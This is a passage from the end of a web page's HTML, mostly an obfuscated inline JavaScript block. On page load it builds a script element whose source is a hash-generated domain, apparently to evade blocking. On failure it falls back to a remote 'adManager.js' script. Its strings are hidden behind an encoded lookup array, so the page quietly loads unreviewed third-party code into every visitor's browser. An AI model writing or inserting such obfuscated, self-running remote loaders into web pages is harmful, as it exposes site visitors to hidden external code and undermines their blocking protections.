-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>